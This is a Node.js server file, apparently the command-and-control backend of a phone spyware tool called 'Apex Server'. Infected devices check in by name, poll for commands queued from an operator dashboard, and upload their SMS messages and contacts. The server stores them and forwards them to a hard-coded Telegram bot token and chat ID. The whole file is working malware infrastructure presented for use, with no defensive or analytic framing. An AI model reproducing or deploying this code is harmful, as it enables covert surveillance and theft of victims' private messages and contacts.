const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const compression = require('compression');
const fs = require('fs');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- CONFIGURATION ---
const BOT_TOKEN = '8934078128:AAFOvXShVBYJ3TJBT34eHg2QZ8ZGA_0F5_M'; // Replace with your BotFather token
const CHAT_ID = '6889335186'; // Replace with your numeric Chat ID
//const PORT = 3000;

const PORT = 3000;

app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

let activeDevices = {};
if (fs.existsSync('devices.json')) {
    try {
        activeDevices = JSON.parse(fs.readFileSync('devices.json', 'utf8'));
        for (let id in activeDevices) activeDevices[id].status = 'Disconnected';
    } catch (e) { console.error("Error loading devices.json"); }
}

let pendingCommands = {};

function saveDevices() {
    fs.writeFileSync('devices.json', JSON.stringify(activeDevices, null, 2));
}

async function sendToTelegram(msg) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (err) { console.error("Telegram error:", err.message); }
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/api/connect', (req, res) => {
    const deviceName = req.query.deviceName || 'Unknown';
    activeDevices[deviceName] = { deviceName, status: 'Connected', lastSeen: Date.now() };
    saveDevices();
    io.emit('device_status', activeDevices[deviceName]);
    res.status(200).send("OK");
});

app.get('/api/get-command', (req, res) => {
    const deviceName = req.query.deviceName;
    if (activeDevices[deviceName]) {
        activeDevices[deviceName].lastSeen = Date.now();
        if (activeDevices[deviceName].status !== 'Connected') {
            activeDevices[deviceName].status = 'Connected';
            saveDevices();
            io.emit('device_status', activeDevices[deviceName]);
        }
    }
    if (pendingCommands[deviceName]) {
        const cmd = pendingCommands[deviceName];
        delete pendingCommands[deviceName];
        return res.status(200).json({ command: cmd });
    }
    res.status(204).send();
});

app.post('/api/sync-data', async (req, res) => {
    const { deviceName, dataType, payload } = req.body;
    const eventName = (dataType === 'SMS') ? 'sms_data_received' : 'contacts_data_received';
    io.emit(eventName, { deviceName, logs: payload });
    
    const telegramMsg = `*New Sync*\n*Device:* ${deviceName}\n*Type:* ${dataType}\n\n${payload.substring(0, 1000)}`;
    await sendToTelegram(telegramMsg);
    res.status(200).send("OK");
});

io.on('connection', (socket) => {
    socket.emit('initial_state', activeDevices);
    socket.on('controller_command', (data) => {
        pendingCommands[data.targetDevice] = data.command;
    });
    socket.on('purge_device_record', (data) => {
        delete activeDevices[data.deviceName];
        saveDevices();
        io.emit('device_removed', data.deviceName);
    });
});

setInterval(() => {
    const now = Date.now();
    for (let id in activeDevices) {
        if (now - activeDevices[id].lastSeen > 120000 && activeDevices[id].status === 'Connected') {
            activeDevices[id].status = 'Disconnected';
            saveDevices();
            io.emit('device_status', activeDevices[id]);
        }
    }
}, 30000);

server.listen(PORT, () => console.log(`Apex Server running on port ${PORT}`));
